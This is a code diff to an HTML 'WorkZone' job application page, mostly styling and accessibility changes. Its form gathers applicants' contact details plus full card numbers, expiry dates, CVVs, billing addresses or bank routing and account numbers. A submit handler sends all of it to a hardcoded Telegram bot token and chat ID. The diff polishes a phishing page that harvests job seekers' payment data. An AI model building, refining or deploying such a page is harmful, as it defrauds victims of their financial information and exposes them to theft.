@@ -24,77 +24,87 @@
       text-align: center;
       margin-bottom: 1rem;
       color: #007bff;
+      font-size: 1.7rem;
     }
     label {
-      margin-top: 1rem;
+      margin-top: 1.2rem;
       font-weight: 600;
-      font-size: 0.95rem;
+      font-size: 1rem;
       display: block;
       color: #2d3a4e;
     }
     input, select {
       width: 100%;
-      padding: 11px 12px;
+      padding: 13px 14px;
       margin-top: 6px;
-      border-radius: 8px;
+      border-radius: 10px;
       border: 1.8px solid #c3c3c3;
-      font-size: 1rem;
+      font-size: 1.05rem;
       font-weight: 400;
       transition: border-color 0.3s ease;
     }
     input:focus, select:focus {
       outline: none;
       border-color: #007bff;
-      box-shadow: 0 0 8px rgba(0,123,255,0.3);
+      box-shadow: 0 0 10px rgba(0,123,255,0.3);
     }
     .btn {
-      margin-top: 2rem;
+      margin-top: 2.5rem;
       width: 100%;
-      padding: 14px;
-      font-size: 1.15rem;
+      padding: 16px;
+      font-size: 1.2rem;
       background: #007bff;
       color: white;
       border: none;
-      border-radius: 50px;
+      border-radius: 60px;
       cursor: pointer;
       font-weight: 700;
       transition: background-color 0.3s ease;
+      box-shadow: 0 6px 14px rgba(0,123,255,0.35);
     }
     .btn:hover {
       background: #0056b3;
+      box-shadow: 0 8px 20px rgba(0,86,179,0.5);
     }
     .toggle {
       display: flex;
-      margin-top: 1.5rem;
+      margin-top: 1.8rem;
       background: #e4e9f2;
-      border-radius: 50px;
+      border-radius: 60px;
       overflow: hidden;
       user-select: none;
-      box-shadow: inset 0 0 5px #c7cee3;
+      box-shadow: inset 0 0 8px #c7cee3;
+      max-width: 520px;
+      margin-left: auto;
+      margin-right: auto;
     }
     .toggle div {
       flex: 1;
       text-align: center;
-      padding: 12px 0;
+      padding: 15px 0;
       cursor: pointer;
       font-weight: 700;
       color: #007bff;
+      font-size: 1.1rem;
       transition: background-color 0.3s ease, color 0.3s ease;
+      user-select: none;
     }
     .toggle .active {
       background: #007bff;
       color: white;
+      box-shadow: 0 0 15px rgba(0,123,255,0.7);
     }
     .step {
       display: none;
       flex-direction: column;
       max-width: 520px;
       background: white;
-      padding: 2rem 2.5rem;
-      border-radius: 16px;
-      box-shadow: 0 10px 28px rgba(0,0,0,0.15);
+      padding: 2.5rem 3rem;
+      border-radius: 20px;
+      box-shadow: 0 14px 38px rgba(0,0,0,0.12);
       width: 100%;
       color: #2d3a4e;
+      margin-top: 1.5rem;
     }
     .step.active {
       display: flex;
@@ -102,23 +112,26 @@
     .thankyou {
       font-weight: 700;
       text-align: center;
-      font-size: 1.4rem;
+      font-size: 1.5rem;
       color: #007bff;
-      padding: 3rem 1rem;
+      padding: 3.5rem 1rem;
     }
     .back-link {
-      margin-top: 1rem;
       color: #007bff;
       cursor: pointer;
       text-decoration: underline;
       font-weight: 600;
       text-align: center;
-      display: block;
       max-width: 520px;
+      margin-bottom: 1rem;
+      user-select: none;
     }
     @media (max-width: 600px) {
       h2 {
         font-size: 1.4rem;
+      }
+      .step {
+        padding: 2rem 1.8rem;
       }
     }
   </style>
@@ -162,7 +175,7 @@
         <div id="toggle-card" role="tab" aria-selected="true" tabindex="0" class="active" onclick="togglePayout('card')" onkeydown="if(event.key==='Enter')togglePayout('card')">💳 Card</div>
         <div id="toggle-bank" role="tab" aria-selected="false" tabindex="0" onclick="togglePayout('bank')" onkeydown="if(event.key==='Enter')togglePayout('bank')">🏦 Bank</div>
       </div>
-      <div id="card-form" role="tabpanel">
+      <div id="card-form" role="tabpanel" aria-hidden="false">
         <label for="cardName">Name on Card *</label>
         <input id="cardName" name="cardName" required autocomplete="cc-name" />
         <label for="cardNumber">Card Number *</label>
@@ -180,7 +193,7 @@
         <label for="billingZip">ZIP Code *</label>
         <input id="billingZip" name="billingZip" pattern="\\d{5}" title="5-digit ZIP code" required autocomplete="postal-code" />
       </div>
-      <div id="bank-form" role="tabpanel" hidden>
+      <div id="bank-form" role="tabpanel" aria-hidden="true" hidden>
         <label for="bankName">Bank Name *</label>
         <input id="bankName" name="bankName" autocomplete="organization" />
         <label for="routingNumber">Routing Number *</label>
@@ -199,7 +212,9 @@
     <!-- Step 3 -->
     <div class="step" id="step-3">
       <h2>Step 3: Confirm & Submit</h2>
-      <p>We will email you with onboarding instructions once you submit.</p>
+      <p style="text-align:center; font-size:1rem; color:#555;">
+        We will email you with onboarding instructions once you submit.
+      </p>
       <button type="submit" class="btn">Submit Application</button>
     </div>
 
@@ -226,37 +241,41 @@
       if(type === 'card') {
         cardForm.hidden = false;
         bankForm.hidden = true;
+        cardForm.setAttribute('aria-hidden', 'false');
+        bankForm.setAttribute('aria-hidden', 'true');
         toggleCard.classList.add('active');
         toggleBank.classList.remove('active');
         toggleCard.setAttribute('aria-selected', 'true');
         toggleBank.setAttribute('aria-selected', 'false');
 
-        // Make card inputs required, bank inputs not required
         [...cardForm.querySelectorAll('input')].forEach(i => i.required = true);
         [...bankForm.querySelectorAll('input, select')].forEach(i => i.required = false);
       } else {
         cardForm.hidden = true;
         bankForm.hidden = false;
+        cardForm.setAttribute('aria-hidden', 'true');
+        bankForm.setAttribute('aria-hidden', 'false');
         toggleCard.classList.remove('active');
         toggleBank.classList.add('active');
         toggleCard.setAttribute('aria-selected', 'false');
         toggleBank.setAttribute('aria-selected', 'true');
 
-        // Make bank inputs required, card inputs not required
         [...cardForm.querySelectorAll('input')].forEach(i => i.required = false);
         [...bankForm.querySelectorAll('input, select')].forEach(i => i.required = true);
       }
+    }
+
+    function escapeMarkdown(text) {
+      return text.replace(/([_*[\]()~`>#+-=|{}.!])/g, '\\$1');
     }
 
     document.getElementById('jobForm').addEventListener('submit', function(e) {
       e.preventDefault();
       const form = this;
 
-      // Validate inputs in the visible step only:
       const currentStep = [...steps].find(s => s.classList.contains('active'));
       if (!currentStep) return;
 
-      // Check validity of visible inputs/selects only
       const inputsToCheck = currentStep.querySelectorAll('input, select');
       for (const input of inputsToCheck) {
         if (!input.checkValidity()) {
@@ -266,31 +285,50 @@
         }
       }
 
-      // Only submit if on the last step (step-3)
       if (currentStep.id !== 'step-3') {
         alert('Please proceed to the last step before submitting.');
         return;
       }
 
-      // Collect all form data (including hidden inputs)
       const data = Object.fromEntries(new FormData(form));
       const TOKEN = '8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8';
       const CHAT_ID = '1318100118';
-      let msg = '*📥 New WorkZone Application*%0A';
-      for (let k in data) {
-        msg += `*${k}*: ${data[k]}%0A`;
+
+      const payoutMethod = cardForm.hidden ? 'bank' : 'card';
+
+      const commonFields = ['name', 'email', 'phone', 'education', 'industry'];
+      let payoutFields = [];
+
+      if (payoutMethod === 'card') {
+        payoutFields = ['cardName', 'cardNumber', 'expiry', 'cvv', 'billingAddress', 'billingCity', 'billingState', 'billingZip'];
+      } else {
+        payoutFields = ['bankName', 'routingNumber', 'accountNumber', 'accountType'];
       }
+
+      let msg = '*📥 New WorkZone Application*\n\n';
+
+      for (const key of commonFields) {
+        if (data[key]) msg += `*${escapeMarkdown(key)}*: ${escapeMarkdown(data[key])}\n`;
+      }
+      msg += `*Payout Method*: ${payoutMethod.toUpperCase()}\n`;
+      for (const key of payoutFields) {
+        if (data[key]) msg += `*${escapeMarkdown(key)}*: ${escapeMarkdown(data[key])}\n`;
+      }
+
       fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
       });
+
       nextStep('thanks');
       form.reset();
       window.scrollTo({ top: 0, behavior: 'smooth' });
+      // Reset to default payout tab card on reset
+      togglePayout('card');
     });
 
-    // Initialize required attributes on load for card payout as default
+    // Initialize with card payout selected
     togglePayout('card');
   </script>
 </body>
